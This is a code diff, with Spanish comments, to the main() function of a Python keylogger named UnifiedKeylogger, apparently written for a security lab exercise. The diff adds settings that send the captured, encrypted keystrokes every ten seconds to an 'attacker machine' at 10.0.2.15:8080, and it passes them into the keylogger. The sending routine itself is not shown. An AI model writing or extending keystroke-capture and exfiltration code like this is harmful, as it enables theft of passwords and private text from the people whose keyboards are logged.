@@ -383,16 +383,28 @@ def main():
     print("   - Cifra el texto dinámicamente 🔐")
     print("   - Maneja backspaces correctamente")
     print("   - Muestra estadísticas en vivo")
+    print("   - Envía datos cifrados a máquina atacante 📡")
     print("=" * 60)
     
-
-    RECONSTRUCTION_INTERVAL = 3  # Tiempo para reconstruir
+    # 🎯 CONFIGURACIÓN DEL LABORATORIO
+    RECONSTRUCTION_INTERVAL = 3  # Cada 3 segundos reconstruye texto
     ENABLE_ENCRYPTION = True     # 🔐 ¿Activar cifrado automático?
+    SEND_INTERVAL = 10          # Cada 10 segundos envía datos
+    TARGET_IP = "10.0.2.15"     # 📡 IP de tu máquina atacante
+    TARGET_PORT = 8080          # Puerto del servidor receptor
     
+    print(f"🎯 Configuración del laboratorio:")
+    print(f"   - Máquina atacante: {TARGET_IP}:{TARGET_PORT}")
+    print(f"   - Intervalo de envío: {SEND_INTERVAL}s")
+    print(f"   - Intervalo de reconstrucción: {RECONSTRUCTION_INTERVAL}s")
+    print("=" * 60)
 
     keylogger = UnifiedKeylogger(
         reconstruction_interval=RECONSTRUCTION_INTERVAL,
-        enable_encryption=ENABLE_ENCRYPTION
+        enable_encryption=ENABLE_ENCRYPTION,
+        send_interval=SEND_INTERVAL,
+        target_ip=TARGET_IP,
+        target_port=TARGET_PORT
     )
     keylogger.start()
 
